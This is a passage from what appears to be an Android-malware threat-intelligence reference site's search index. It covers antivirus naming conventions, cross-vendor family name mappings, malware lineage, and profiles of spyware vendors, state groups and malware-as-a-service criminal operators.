Zoner Czech, limited mobile"},{"location":"malware/naming-conventions/#interpreting-virustotal-results-for-android","title":"Interpreting VirusTotal Results for Android","text":"<p>When analyzing an APK on VirusTotal:</p> <ul> <li>High detection count with varied family names: the engines disagree on the family. Check ThreatFabric, ESET, and Kaspersky names first as they have the best Android coverage.</li> <li>\"Artemis\" or hash-based names: McAfee/Trellix detected it generically via cloud ML. No family attribution.</li> <li>\"Trojan.Gen.MBT\" or \"Android.Reputation\": Symantec generic detection. No useful family info.</li> <li>\"Static AI\" or \"MALICIOUS\": next-gen engines (SentinelOne, DeepInstinct) flagged it but provide no family name.</li> <li>Chinese engine cluster agrees: Tencent, Alibaba, Baidu, Huorong tend to share signatures. If they all name a family, it's worth checking.</li> <li>Only 2-3 engines detect it: either new/zero-day sample, or the sample is packed/obfuscated. Check the \"Details\" tab for packer detection.</li> <li>Bitdefender family detected: eScan, GData, Emsisoft, VIPRE, Arcabit all license Bitdefender's engine, so they'll show the same or similar detection. Don't count them as independent confirmations.</li> </ul>"},{"location":"malware/naming-conventions/#researchthreat-intel-names","title":"Research/Threat Intel Names","text":"<p>Threat intelligence firms assign proper names used in reports and blog posts:</p> Vendor Naming Style Examples ThreatFabric Mythological, original Cerberus, Hydra, Medusa, Anatsa, Hook, Vultur, Xenomorph, Octo Cleafy Uses ThreatFabric names or coins their own Copybara, PixPirate, ToxicPanda, SharkBot, BRATA Group-IB Original names Gustuff, GodFather, GoldDigger Kaspersky Descriptive or campaign-based Roaming Mantis, Harly, SilentFade ESET Descriptive or abbreviated FurBall, FinSpy (uses \"FinSpy\" not FinFisher) McAfee Descriptive, often uses common name Uses widely-adopted names in blogs, detection names differ Proofpoint Sometimes coins alternatives TangleBot (= Medusa) Cyble Uses common names, occasionally original Generally adopts existing names from first publisher Zimperium Original names for their discoveries GriftHorse, Dark Herring, RatMilad Lookout Original or common names Pegasus (Chrysaor for Android), Hermit Citizen Lab Uses vendor names Pegasus, Predator"},{"location":"malware/naming-conventions/#googles-naming","title":"Google's Naming","text":"<p>Google uses its own taxonomy in Android security bulletins and Play Protect communications:</p> <ul> <li>Internal tracking IDs not disclosed publicly</li> <li>Blog posts use generic descriptions (\"potentially harmful application\" / PHA)</li> <li>Google's Android Security team sometimes adopts research names in public talks</li> <li>Android security bulletins reference CVEs, not malware family names</li> <li>Google TAG (Threat Analysis Group) uses vendor names when discussing commercial spyware: Pegasus, Predator, Hermit</li> </ul>"},{"location":"malware/naming-conventions/#cross-vendor-name-mapping","title":"Cross-Vendor Name Mapping","text":"<p>The following table maps the most commonly used name to the names used by major AV vendors and research firms. This is the single most useful reference for cross-referencing threat reports.</p>"},{"location":"malware/naming-conventions/#banking-trojans","title":"Banking Trojans","text":"Common Name McAfee Kaspersky ESET Trend Micro Bitdefender Fortinet Symantec Albiriox - Trojan-Banker.AndroidOS.Albiriox - - Android.Trojan.Banker - - Antidot - Trojan-Banker.AndroidOS.Antidot - - Android.Trojan.Banker - - Anubis Android/Anubis Trojan-Banker.AndroidOS.Anubis Android/Spy.Banker.BSI AndroidOS_Anubis Android.Trojan.Banker Android/Anubis Trojan.Gen.MBT Anatsa Android/Anatsa Trojan-Banker.AndroidOS.Anatsa Android/Spy.Banker.BJK AndroidOS_TeaBot Android.Trojan.Banker Android/Anatsa Android.Reputation.1 BankBot Android/BankBot Trojan-Banker.AndroidOS.Agent Android/Spy.Banker AndroidOS_BankBot Android.Trojan.Banker Android/Agent Trojan.Gen Cerberus Android/Cerberus Trojan-Banker.AndroidOS.Cebruser Android/Spy.Cerberus AndroidOS_Cerberus Android.Trojan.Banker.VT Android/Cerberus Trojan.Gen.MBT Ermac Android/Ermac Trojan-Banker.AndroidOS.Ermac Android/Spy.Banker AndroidOS_Ermac Android.Trojan.Banker Android/Ermac Trojan.Gen.MBT GodFather Android/GodFather Trojan-Banker.AndroidOS.Godfather Android/Spy.Banker AndroidOS_GodFather Android.Trojan.Banker Android/GodFather Trojan.Gen Hook Android/Hook Trojan-Banker.AndroidOS.Hook Android/Spy.Hook AndroidOS_Hook Android.Trojan.Banker Android/Hook Trojan.Gen.MBT Hydra Android/Hydra Trojan-Banker.AndroidOS.Piom Android/Spy.Banker.BRR AndroidOS_Hydra Android.Trojan.Banker Android/Hydra Trojan.Gen.MBT Medusa Android/Medusa Trojan-Banker.AndroidOS.Medusa Android/Spy.Banker AndroidOS_Medusa Android.Trojan.Banker Android/Medusa Trojan.Gen Octo Android/Octo Trojan-Banker.AndroidOS.Coper Android/Spy.Agent.CLR AndroidOS_Coper Android.Trojan.Banker Android/Coper Trojan.Gen.MBT SharkBot Android/SharkBot Trojan-Banker.AndroidOS.Sharkbot Android/Spy.Banker AndroidOS_SharkBot Android.Trojan.Banker Android/SharkBot Trojan.Gen Vultur Android/Vultur Trojan-Banker.AndroidOS.Vultur Android/Spy.Banker AndroidOS_Vultur Android.Trojan.Banker Android/Vultur Trojan.Gen.MBT BingoMod - Trojan-Banker.AndroidOS.BingoMod - - Android.Trojan.Banker - - BlankBot - Trojan-Banker.AndroidOS.BlankBot - - Android.Trojan.Banker - - Brokewell - Trojan-Banker.AndroidOS.Brokewell - - Android.Trojan.Banker - - Crocodilus - Trojan-Banker.AndroidOS.Crocodilus - - Android.Trojan.Banker - - GoldPickaxe - Trojan-Banker.AndroidOS.GoldPickaxe Android/Spy.GoldPickaxe - Android.Trojan.Banker - - Herodotus - Trojan-Banker.AndroidOS.Herodotus - - Android.Trojan.Banker - - Klopatra - Trojan-Banker.AndroidOS.Klopatra - - Android.Trojan.Banker - - NGate - - Android/NGate - - - - RatOn - Trojan-Banker.AndroidOS.RatOn - - - - - Sturnus - Trojan-Banker.AndroidOS.Sturnus - - - - - TrickMo - Trojan-Banker.AndroidOS.TrickMo - - Android.Trojan.Banker - - TsarBot - Trojan-Banker.AndroidOS.TsarBot - - Android.Trojan.Banker - - Xenomorph Android/Xenomorph Trojan-Banker.AndroidOS.Xenomorph Android/Spy.Banker AndroidOS_Xenomorph Android.Trojan.Banker Android/Xenomorph Trojan.Gen"},{"location":"malware/naming-conventions/#fraud-and-sms","title":"Fraud and SMS","text":"Common Name McAfee Kaspersky ESET Trend Micro Joker Android/Joker Trojan.AndroidOS.Joker Android/Joker AndroidOS_Joker FluBot Android/FluBot Trojan-Banker.AndroidOS.Cabassous Android/TrojanDropper.Agent AndroidOS_FluBot Harly Android/Harly Trojan.AndroidOS.Harly Android/Joker AndroidOS_Harly GriftHorse Android/GriftHorse Trojan.AndroidOS.GriftHorse Android/Agent AndroidOS_GriftHorse"},{"location":"malware/naming-conventions/#regional-banking-trojans","title":"Regional Banking Trojans","text":"Common Name McAfee Kaspersky ESET Region Fakecalls Android/Fakecalls Trojan-Banker.AndroidOS.Fakecalls Android/Spy.Banker.Fakecalls South Korea FluHorse - Trojan-Banker.AndroidOS.FluHorse - East Asia (Taiwan, Vietnam) Gigabud - Trojan-Banker.AndroidOS.Gigabud - Southeast Asia Frogblight - Trojan-Banker.AndroidOS.Frogblight Android/Spy.Banker.Frogblight Turkey Mamont - Trojan-Banker.AndroidOS.Mamont Android/Spy.Banker.Mamont Russia MoqHao Android/MoqHao Trojan-Banker.AndroidOS.Wroba Android/TrojanDropper.Agent East Asia SoumniBot Android/Banker.SoumniBot Trojan-Banker.AndroidOS.SoumniBot - South Korea DeVixor - Trojan-Banker.AndroidOS.DeVixor - Iran Zanubis Android/Zanubis Trojan-Banker.AndroidOS.Zanubis Android/Spy.Banker.Zanubis Peru"},{"location":"malware/naming-conventions/#crypto-stealers-and-sdk-malware","title":"Crypto Stealers and SDK Malware","text":"Common Name McAfee Kaspersky ESET Type Goldoson Android/Goldoson AdWare.AndroidOS.Goldoson - Malicious SDK Necro Android/Necro Trojan-Downloader.AndroidOS.Necro Android/TrojanDownloader.Necro Supply chain SparkCat Android/SparkCat Trojan.AndroidOS.SparkCat Android/Spy.SparkCat OCR crypto stealer SpyAgent Android/SpyAgent Trojan-Spy.AndroidOS.SpyAgent - OCR crypto stealer SpyLoan Android/SpyLoan Trojan.AndroidOS.SpyLoan Android/SpyLoan Predatory lending"},{"location":"malware/naming-conventions/#spyware","title":"Spyware","text":"Common Name McAfee Kaspersky ESET Also Known As Mandrake Android/Mandrake Trojan-Spy.AndroidOS.Mandrake Android/Spy.Mandrake - Pegasus Android/Pegasus Trojan-Spy.AndroidOS.Pegasus Android/Spy.Chrysaor Chrysaor (Android variant) Predator Android/Predator Trojan-Spy.AndroidOS.Predator Android/Spy.Agent Alien (loader component) FinSpy Android/FinSpy Trojan-Spy.AndroidOS.FinSpy Android/Spy.FinSpy FinFisher, FinSpy Mobile Hermit Android/Hermit Trojan-Spy.AndroidOS.Hermit Android/Spy.Agent RCS Android SpyNote Android/SpyNote Trojan-Spy.AndroidOS.SpyNote Android/Spy.SpyNote SpyMax, CypherRat KoSpy - Trojan-Spy.AndroidOS.KoSpy - APT37/ScarCruft spyware AridSpy - Trojan-Spy.AndroidOS.AridSpy Android/Spy.AridSpy Arid Viper/APT-C-23 GuardZoo - Trojan-Spy.AndroidOS.GuardZoo - Modified Dendroid RAT LightSpy - Trojan-Spy.AndroidOS.LightSpy Android/Spy.LightSpy DragonEgg (Lookout), WyrmSpy (related) EagleMsgSpy - - - Wuhan Chinasoft Token lawful intercept BoneSpy - Trojan-Spy.AndroidOS.BoneSpy - DroidWatcher derivative, Sandcat PlainGnome - Trojan-Spy.AndroidOS.PlainGnome - Sandcat, companion to BoneSpy DCHSpy - Trojan-Spy.AndroidOS.DCHSpy - MuddyWater/MOIS surveillanceware FireScam - Trojan-Spy.AndroidOS.FireScam - Fake RuStore/Telegram Premium PJobRAT - Trojan-Spy.AndroidOS.PJobRAT - - Rafel RAT - Trojan-Spy.AndroidOS.RafelRAT - Open-source RAT BTMOB RAT - Trojan-Spy.AndroidOS.BTMob - CraxRAT/SpySolr lineage, MaaS RAT"},{"location":"malware/naming-conventions/#common-confusion-cases","title":"Common Confusion Cases","text":"<p>Families that are frequently confused due to overlapping names, shared code, or vendor disagreements:</p> Usually Called Also Known As Actual Relationship Anatsa TeaBot Same family. ThreatFabric named it Anatsa, other researchers called it TeaBot. Alien Cerberus v2 Distinct fork. Built on Cerberus code but with significant additions. Not merely a version update. Ermac Cerberus v3 Distinct fork by DukeEugene. Shares Cerberus DNA but different operator and added features. Hook Ermac v3 Evolution. DukeEugene marketed it as new, but ThreatFabric proved it contains all Ermac code plus new commands. Octo ExobotCompact, Coper Same lineage. Exobot (2016) -&gt; ExobotCompact (2021) -&gt; Coper -&gt; Octo (2022) -&gt; Octo2 (2024). Hydra BianLian Distinct families. Hydra was initially tracked alongside a dropper called BianLian (not the ransomware group). Medusa TangleBot Same family. ThreatFabric named it Medusa, Proofpoint called it TangleBot. BRATA AmexTroll Same lineage. BRATA rebranded/evolved, AmexTroll is a later variant. Copybara BRATA v3 Related but distinct. Evolved from BRATA codebase, but Cleafy tracked it as separate. Cabassous FluBot Same family. Kaspersky's detection name (Cabassous) vs common research name (FluBot). Cebruser Cerberus Same family. Kaspersky detection name is \"Cebruser\" instead of \"Cerberus\". Piom Hydra Same family. Kaspersky's detection name for Hydra samples. Wroba MoqHao Same family. Kaspersky uses \"Wroba,\" McAfee uses \"MoqHao,\" campaign tracked as \"Roaming Mantis.\" XLoader MoqHao Same family. Some vendors use XLoader for MoqHao/Wroba variants. Frogblight Coper variant? Possible relationship. Kaspersky notes possible connection to Coper/Octo lineage. GoldPickaxe GoldDigger Related but distinct. GoldFactory group operates GoldDigger, GoldPickaxe (Android + iOS), and Gigabud. GoldPickaxe adds facial biometric theft. Gigabud GoldDigger, Gigaflower Same GoldFactory group. Shares code (<code>libstrategy.so</code>) and Virbox packer with GoldDigger. Gigaflower is a pre-release successor. LightSpy DragonEgg, WyrmSpy DragonEgg is Lookout's name for the Android variant. ThreatFabric linked it to LightSpy iOS. WyrmSpy may be a related successor. BoneSpy Gamaredon mobile Initially attributed to Gamaredon (FSB), reattributed to Sandcat (Uzbekistan SSS). BingoMod BRATA variant? Behavioral similarity (post-fraud device wipe) but independent codebase per Cleafy analysis. NGate NFCGate NGate uses the NFCGate academic tool for NFC relay. NFCGate itself is a legitimate security research tool. TrickMo TrickBot mobile Originally a companion to TrickBot desktop trojan. The 2024 resurgence operates independently with no TrickBot dependency. Antidot AppLite AppLite is an Antidot variant (Zimperium naming) targeting corporate employees. Same family, different distribution strategy."},{"location":"malware/naming-conventions/#how-to-cross-reference","title":"How to Cross-Reference","text":""},{"location":"malware/naming-conventions/#online-resources","title":"Online Resources","text":"<ul> <li>Malpedia maintains a malware reference database with aliases across vendors</li> <li>MISP Galaxy provides structured threat intelligence clusters with cross-vendor mapping</li> <li>VirusTotal shows detection names from 60+ AV engines for any sample</li> <li>MITRE ATT&amp;CK Software lists known aliases for documented malware families</li> <li>bazaar.abuse.ch malware sample database with multi-vendor tagging</li> </ul>"},{"location":"malware/naming-conventions/#by-indicator","title":"By Indicator","text":"<p>When vendor names don't match, correlate by:</p> Indicator Method C2 infrastructure Same C2 domains/IPs across reports from different vendors Code overlap Shared class names, string constants, obfuscation patterns Certificate Same signing certificate across samples Package name patterns Similar package naming schemes (e.g., <code>com.xyz.abc</code> patterns) Botnet panel Same C2 panel framework (often leaked or reused) String artifacts Unique strings, error messages, or debug output Network protocol Identical C2 protocol structure, encryption methods, API endpoints"},{"location":"malware/naming-conventions/#practical-workflow","title":"Practical Workflow","text":"<p>When you encounter an unfamiliar name in a report:</p> <ol> <li>Search Malpedia for the name to find aliases</li> <li>Check the vendor's detection name format against the tables above</li> <li>Search VirusTotal for a known sample hash from the report, check other vendor names</li> <li>Look for C2 infrastructure overlap with known families</li> <li>Check this page's confusion cases table</li> </ol>"},{"location":"malware/naming-conventions/#lineage-and-code-reuse","title":"Lineage and Code Reuse","text":"<p>Android malware families frequently share code. Understanding why helps predict capability overlap.</p> Reason Example Source code leak Cerberus leaked September 2020, spawned Alien, Ermac, Hook Source code leak Anubis leaked after developer arrest, code reused in GodFather Source code leak SpyNote v6.4 leaked, thousands of operators globally MaaS rebranding Same operator sells under new name: Ermac -&gt; Hook (both DukeEugene) Developer overlap Same developers work on multiple projects across families Direct evolution Exobot -&gt; ExobotCompact -&gt; Coper -&gt; Octo -&gt; Octo2 Regional adaptation BRATA (Brazil) -&gt; Copybara (Italy) Feature fork TgToxic (SE Asia) -&gt; ToxicPanda (EU/LATAM) <p>This means \"family\" boundaries are often blurry. Two samples with different names may share 80% of their code. The Families section documents these relationships for each family.</p>"},{"location":"malware/threat-actors/","title":"Threat Actors","text":"<p>The Android malware ecosystem is operated by distinct categories of threat actors ranging from nation-state intelligence agencies to solo developers selling RAT builders on Telegram. Understanding who builds and deploys Android malware, and why, is essential for attribution, threat modeling, and predicting what comes next.</p>"},{"location":"malware/threat-actors/#maas-operators-malware-as-a-service","title":"MaaS Operators (Malware-as-a-Service)","text":"<p>The dominant business model in Android banking malware. A developer builds and maintains the malware, panel, and inject kits. Operators rent access on a monthly subscription and deploy the malware against their own target set. The developer provides updates, support, and evasion patches through private Telegram channels.</p>"},{"location":"malware/threat-actors/#business-model","title":"Business Model","text":"<ol> <li>Developer advertises on underground forums (XSS, Exploit.in) and Telegram</li> <li>Operator pays monthly subscription for panel access, APK builder, and inject kit</li> <li>Operator handles distribution: smishing campaigns, Play Store droppers, social engineering</li> <li>Stolen credentials flow through the panel to the operator</li> <li>Operator monetizes via money mule networks, SIM swaps, or direct account takeover</li> <li>Developer earns recurring revenue from multiple simultaneous operators</li> </ol> <p>The developer-operator split means a single malware family may target different countries simultaneously depending on which operators are active. Attribution to a specific criminal group requires identifying the operator, not just the malware family.</p>"},{"location":"malware/threat-actors/#pricing","title":"Pricing","text":"<p>Prices sourced from underground advertisements and open-source threat intelligence reporting. See MaaS Economy for full market context.</p> Family Monthly Price Key Features Developer / Group Hook $7,000 VNC, RAT, accessibility abuse, keylogging DukeEugene BTMOB RAT $5,000-$10,000 Evolved from CraxRAT/SpySolr lineage Unknown Cerberus $4,000 (pre-leak) Overlays, keylogging, 2FA theft Leaked September 2020 Ermac $3,000 Fork of Alien/Cerberus, 467 inject targets DukeEugene GodFather $3,000-$5,000 (est.) Overlays, VNC, VirtualApp sandboxing Unknown (Anubis lineage) Octo / Octo2 $2,000 Remote access, keylogging, DGA in v2 \"Architect\" (Octo2) Xenomorph $2,000-$3,000 (est.) ATS engine, 400+ bank targets Hadoken Security Group Medusa $2,000-$4,000 (est.) VNC, keylogging, minimal permissions in v2 Multiple operators Anatsa Private (not publicly sold) ATS-based, Play Store droppers Unknown Albiriox $650-$720 Budget tier, basic overlay + keylogging Unknown"},{"location":"malware/threat-actors/#infrastructure","title":"Infrastructure","text":"Component Typical Setup Sales channel Private Telegram groups, XSS Forum, Exploit.in C2 hosting Bulletproof hosting providers, frequently rotated domains Panel PHP/Laravel web app, sometimes hardened with IP whitelisting Builder Desktop or web-based APK generator with obfuscation options Inject kits HTML/CSS overlay pages, sold per-bank or as regional bundles Money flow Cryptocurrency (Monero preferred, Bitcoin accepted), Telegram escrow Support 24/7 Telegram support channel, update announcements, bug tracking"},{"location":"malware/threat-actors/#maas-lineage-chains","title":"MaaS Lineage Chains","text":"<p>MaaS families are interconnected through source leaks, developer movement, and direct evolution:</p> <pre><code>Cerberus (DukeEugene, 2019)\n  \u2514\u2500 Source leaked Sept 2020\n      \u251c\u2500 Alien (2020) \u2500\u2500\u2500 forked by DukeEugene \u2500\u2500&gt; Ermac (2020) \u2500\u2500&gt; Hook (2022)\n      \u2514\u2500 Dozens of unnamed variants from lesser operators\n\nBankBot (open source, 2016)\n  \u2514\u2500 Influenced \u2500\u2500&gt; Anubis (2018)\n      \u2514\u2500 Source leaked \u2500\u2500&gt; GodFather (2022)\n\nExobot (2016) \u2500\u2500&gt; ExobotCompact \u2500\u2500&gt; Coper \u2500\u2500&gt; Octo (2022) \u2500\u2500&gt; Octo2 (2024)\n\nCraxRAT \u2500\u2500&gt; SpySolr \u2500\u2500&gt; BTMOB RAT (2025)\n</code></pre> <p>The Cerberus leak was the most consequential single event. It seeded multiple families and lowered the barrier for new entrants. Any sample with Cerberus-derived code may be operated by entirely unrelated groups.</p>"},{"location":"malware/threat-actors/#state-sponsored-apt","title":"State-Sponsored / APT","text":"<p>Government-backed actors deploying Android malware for intelligence collection, surveillance of dissidents and journalists, or military operations. Capabilities range from zero-click exploits to basic RATs, depending on the actor's resources and objectives.</p>"},{"location":"malware/threat-actors/#commercial-spyware-vendors","title":"Commercial Spyware Vendors","text":"<p>These companies develop and sell mobile exploitation tools to government clients. They occupy a legal gray area: marketed as \"lawful intercept\" tools, but repeatedly documented targeting journalists, activists, and political opposition.</p> Vendor Country Product Status Family Page NSO Group Israel Pegasus Active, US Entity List since 2021 Pegasus Cytrox / Intellexa North Macedonia / Ireland Predator Sanctioned by US Treasury 2024, fragmented operations Predator Gamma Group / FinFisher UK / Germany FinSpy Bankrupt 2022, some operations may continue under different entities FinSpy Paragon Solutions Israel Graphite Active, less publicly documented than NSO QuaDream Israel Reign Shut down April 2023 after Citizen Lab / Microsoft exposure Candiru Israel DevilsTongue US Entity List since 2021, primarily Windows/browser focused <p>NSO Group (Pegasus): The benchmark for mobile exploitation. Zero-click exploit chains targeting iMessage, WhatsApp, and Android browser engines. Sold to 40+ government clients. Documented on the phones of heads of state, journalists (Jamal Khashoggi associates), human rights defenders, and opposition politicians across dozens of countries. See Pegasus for full technical analysis.</p> <p>Cytrox/Intellexa (Predator): One-click exploit chains delivered via links. Intellexa Consortium operated across multiple EU jurisdictions to evade export controls. Google TAG documented Predator exploiting five Android zero-days in 2021 (CVE-2021-37973, CVE-2021-37976, CVE-2021-38000, CVE-2021-38003, CVE-2021-1048). US Treasury sanctions in March 2024 targeted individuals and entities in the consortium. See Predator.</p> <p>Gamma Group (FinSpy/FinFisher): Sold to governments including Ethiopia, Bahrain, and Turkey for targeting dissidents. FinSpy Android implant used accessibility abuse, root exploits, and DexClassLoader for modular payload delivery. FinFisher GmbH filed for insolvency in 2022 after sustained legal pressure. See FinSpy.</p>"},{"location":"malware/threat-actors/#nation-state-groups","title":"Nation-State Groups","text":"Group Nation Primary Targets Android Tools MuddyWater / MOIS Iran Iranian dissidents, regional adversaries DCHSpy targeting Iranian citizens via fake VPN apps Gamaredon / Primitive Bear Russia (FSB) Ukrainian military, government officials BoneSpy, PlainGnome targeting Ukrainian military personnel Sandworm / Seashell Blizzard Russia (GRU) Ukrainian infrastructure, NATO Limited Android operations, primarily infrastructure-focused APT-C-23 / Arid Viper Palestine (Hamas-linked) Israeli and Palestinian targets AridSpy via trojanized messaging apps Transparent Tribe / APT36 Pakistan (ISI-linked) Indian military and government PJobRAT, CapraRAT targeting Indian defense personnel ScarCruft / APT37 North Korea South Korean defectors, journalists RambleOn, FastViewer targeting South Korean users Kimsuky / APT43 North Korea South Korean think tanks, diplomats KoSpy via fake utility apps Houthi-linked operators Yemen Yemeni military targets GuardZoo via trojanized mapping apps Chinese PSB (Public Security Bureau) China Domestic surveillance, Uyghurs, Tibetans EagleMsgSpy, custom surveillance tools"},{"location":"malware/threat-actors/#attribution-challenges","title":"Attribution Challenges","text":"<p>State-sponsored Android malware attribution is complicated by several factors:</p> <ul> <li>Commercial spyware is sold to many governments, so discovering Pegasus on a device does not identify which government deployed it without infrastructure analysis</li> <li>Nation-state groups frequently use modified open-source tools (Metasploit, SpyNote forks) that are also used by criminals</li> <li>Infrastructure overlaps occur when groups share bulletproof hosting providers or VPN services</li> <li>False flag operations deliberately mimic other groups' tooling and infrastructure</li> <li>The line between \"state-sponsored\" and \"state-tolerated\" is blurred, particularly for Russian and Chinese operations where criminal groups operate with implicit government permission</li> </ul>"},{"location":"malware/threat-actors/#regional-criminal-groups","title":"Regional Criminal Groups","text":"<p>Organized cybercrime groups operating Android malware with specific regional targeting. These groups are more sophisticated than solo developers but typically focused on a single malware family or geographic region.</p>"},{"location":"malware/threat-actors/#goldfactory","title":"GoldFactory","text":"<p>Origin: China-nexus, targeting Southeast Asia and APAC.</p> <p>Operations: Develops and operates banking trojans targeting Thai, Vietnamese, and broader APAC financial institutions. Uses Virbox commercial packer for anti-analysis. Known for combining traditional banking trojan techniques with biometric theft.</p> <p>Families:</p> <ul> <li>Gigabud: Android banking trojan targeting Thai and APAC banks, Virbox-packed, overlay attacks with screen recording</li> <li>GoldPickaxe: Steals facial biometrics to bypass bank liveness checks in Thailand and Vietnam, also targets iOS via MDM profiles</li> </ul> <p>Distinguishing traits: Heavy use of commercial packers, biometric theft as a differentiator, cross-platform (Android + iOS) operations.</p>"},{"location":"malware/threat-actors/#hadoken-security-group","title":"Hadoken Security Group","text":"<p>Origin: Believed European-based.</p> <p>Operations: Developed and operated Xenomorph as a MaaS offering. The group progressed from basic overlay banking trojan to a full ATS (Automated Transfer System) engine with 400+ bank targets across Europe, US, and APAC.</p> <p>Families:</p> <ul> <li>Xenomorph: Three major versions. v1 (2022) basic overlays. v2 added C2 protocol updates. v3 (2023) introduced ATS engine for automated on-device fraud.</li> </ul> <p>Distinguishing traits: Rapid iteration cycle, public-facing development activity, transitioned from MaaS to potentially operating independently.</p>"},{"location":"malware/threat-actors/#dukeeugene","title":"DukeEugene","text":"<p>Origin: Russian-speaking threat actor.</p> <p>Operations: The most prolific single developer in the Android MaaS ecosystem. Created Cerberus (2019), attempted to auction the source code, then leaked it for free when the auction failed (September 2020). Subsequently developed Ermac (2020) and Hook (2022), each building on the previous codebase with new features. Advertised and sold through Telegram and underground forums.</p> <p>Families:</p> <ul> <li>Cerberus: Original MaaS banking trojan, overlay attacks, keylogging</li> <li>Ermac: Cerberus fork via Alien, 467 banking app targets</li> <li>Hook: Premium-tier evolution with VNC, RAT, $7,000/month</li> </ul> <p>Distinguishing traits: Consistent code lineage across three families, premium pricing strategy, prolific advertising on underground forums.</p>"},{"location":"malware/threat-actors/#neo_net","title":"Neo_Net","text":"<p>Origin: Spanish-speaking operator (Mexico-based per research).</p> <p>Operations: Targeted Spanish and Latin American banks with relatively simple SMS phishing campaigns combined with Android malware. Despite using unsophisticated tools, successfully compromised thousands of victims. Operated from 2021 through at least 2023.</p> <p>Distinguishing traits: Low technical sophistication compensated by high-volume social engineering, Spanish-language targeting, combined smishing with credential-stealing APKs.</p>"},{"location":"malware/threat-actors/#roaming-mantis","title":"Roaming Mantis","text":"<p>Origin: East Asian threat group (China-nexus suspected).</p> <p>Operations: Long-running operation primarily targeting Japan and South Korea through massive smishing campaigns. Known for DNS hijacking on compromised routers to redirect victims to malicious APK downloads. Operations expanded to Europe and other regions over time.</p> <p>Families:</p> <ul> <li>MoqHao (also known as Wroba, XLoader): SMS worm with banking credential theft, DNS hijacking, multi-region targeting</li> </ul> <p>Distinguishing traits: SMS-based propagation (worm-like behavior), DNS hijacking for distribution, long operational lifespan (active since 2018+), geographic expansion from East Asia to global.</p>"},{"location":"malware/threat-actors/#brata-copybara-operators","title":"BRATA / Copybara Operators","text":"<p>Origin: Italian-focused criminal group(s).</p> <p>Operations: Evolved from the original BRATA banking trojan (Brazilian origin, later repurposed for Italian banks) to the Copybara family targeting Italian financial institutions. Primarily uses vishing (voice phishing / TOAD - Telephone-Oriented Attack Delivery) for distribution, calling victims while impersonating bank staff.</p> <p>Families:</p> <ul> <li>BRATA: Factory reset after fraud, GPS tracking, SMS interception</li> <li>Copybara: VNC-based on-device fraud, Italian bank targeting</li> <li>ToxicPanda: Further evolution targeting Italian and Latin American banks</li> </ul> <p>Distinguishing traits: Vishing-based distribution, Italy-focused targeting, progressive code evolution across three named families, factory reset as anti-forensic technique.</p>"},{"location":"malware/threat-actors/#inthebox","title":"InTheBox","text":"<p>Origin: Russian-speaking threat actor.</p> <p>Operations: Not a malware developer but the dominant inject kit vendor in the Android MaaS ecosystem. Sells HTML overlay pages (webinjects) that mimic banking apps, crypto wallets, and payment platforms. Operates a dedicated marketplace offering per-bank and bundled inject kits compatible with major MaaS families.</p> <p>Distinguishing traits: Specialization in inject kits rather than malware itself, supply chain role supporting multiple MaaS operators, 1,000+ banking app overlays in catalog.</p>"},{"location":"malware/threat-actors/#solo-developers-small-teams","title":"Solo Developers / Small Teams","text":"<p>Individual developers or small teams building and selling Android RATs and malware through Telegram and underground forums. Lower sophistication than MaaS operations but responsible for a significant volume of infections due to low cost and accessibility.</p>"},{"location":"malware/threat-actors/#open-source-leaked-tool-ecosystem","title":"Open Source / Leaked Tool Ecosystem","text":"Tool Status Usage Rafel RAT Open source on GitHub Widely used by low-skill operators, Check Point documented 120+ campaigns using Rafel SpyNote (cracked) Leaked/cracked builder circulating freely Originally commercial ($200-$500), cracked versions enable mass adoption AhMyth Open source Academic RAT project repurposed for malicious use L3MON Open source Node.js-based Android RAT, simple deployment AndroRAT Open source One of the earliest Android RATs, still used in modified forms CraxRAT Cracked builder Evolved into SpySolr and BTMOB RAT <p>The availability of free and cracked tools means that anyone with basic technical skills can deploy an Android RAT. The resulting infections are typically unsophisticated but high-volume. Check Point's research on Rafel RAT found it deployed against military targets, government entities, and ordinary users across 120+ campaigns, demonstrating that even basic tools can reach high-value targets through social engineering.</p>"},{"location":"malware/threat-actors/#telegram-based-operations","title":"Telegram-Based Operations","text":"<p>Telegram is the primary marketplace and communication channel for small-scale Android malware operations:</p> <ul> <li>Builder sales: Developers sell RAT builders for $50-$500 one-time or $20-$100/month</li> <li>Cracked tools: Channels distribute cracked versions of commercial tools</li> <li>Tutorials: Step-by-step guides for building and deploying Android malware</li> <li>Victim logs: Operators share screenshots of active bots as proof of capability</li> <li>Mule recruitment: Money mule and drop account recruitment for monetization</li> </ul>"},{"location":"malware/threat-actors/#devixor","title":"DeVixor","text":"<p>A notable example of a solo developer operating publicly. The DeVixor developer shares development updates, feature additions, and victim statistics on Telegram. Targets Iranian users through fake VPN apps, exploiting demand for censorship circumvention tools. The public nature of the operation illustrates the low perceived risk for operators in certain jurisdictions.</p>"},{"location":"malware/threat-actors/#data-harvesting-operations","title":"Data Harvesting Operations","text":"<p>Not traditional malware operators but commercial entities conducting data collection at scale through SDK integration, ad-tech infrastructure, and dual-use applications. These operations collect more data from more devices than most malware campaigns, but operate under the cover of privacy policies and terms of service.</p> <p>Detailed coverage in Grayware &amp; Data Harvesting.</p>"},{"location":"malware/threat-actors/#key-actors","title":"Key Actors","text":"Entity Method Scale Status X-Mode / Outlogic Location SDK in 400+ apps Millions of devices FTC action 2024 Measurement Systems Data harvesting SDK 60M+ downloads Removed from Play Store 2022, reappeared Gravy Analytics RTB data + SDKs Millions of devices Hacked January 2025, data exposed Sensor Tower VPN apps as data collection Millions of devices Exposed by BuzzFeed 2020 Patternz / ISA Ad network as surveillance front Claims 600K app reach Exposed 2024 Predicio Location SDK Unknown scale Linked to Gravy Analytics breach"},{"location":"malware/threat-actors/#overlap-with-state-actors","title":"Overlap with State Actors","text":"<p>The data harvesting ecosystem intersects with government surveillance in documented ways:</p> <ul> <li>X-Mode sold location data to US military contractors (DIA, through intermediaries)</li> <li>Measurement Systems SDK was linked to a Virginia company connected to Packet Forensics, a lawful intercept equipment vendor</li> <li>Babel Street (Locate X) purchased commercial location data for use by US government agencies including CBP and ICE</li> <li>The NSA and other intelligence agencies have acknowledged purchasing commercially available location data</li> <li>Patternz explicitly marketed SDK-sourced data for intelligence applications</li> </ul> <p>This creates a parallel surveillance channel that bypasses the legal frameworks governing traditional signals intelligence. Instead of intercepting communications through warranted collection, agencies purchase data that was \"consented to\" through app privacy policies that no one reads.</p>"},{"location":"malware/threat-actors/#attribution-resources","title":"Attribution Resources","text":"<p>Mapping samples to threat actors requires correlating technical indicators with operational patterns.</p> Indicator Type What It Reveals Code overlap / shared libraries Family lineage and developer identity C2 infrastructure (IP, domain, TLS 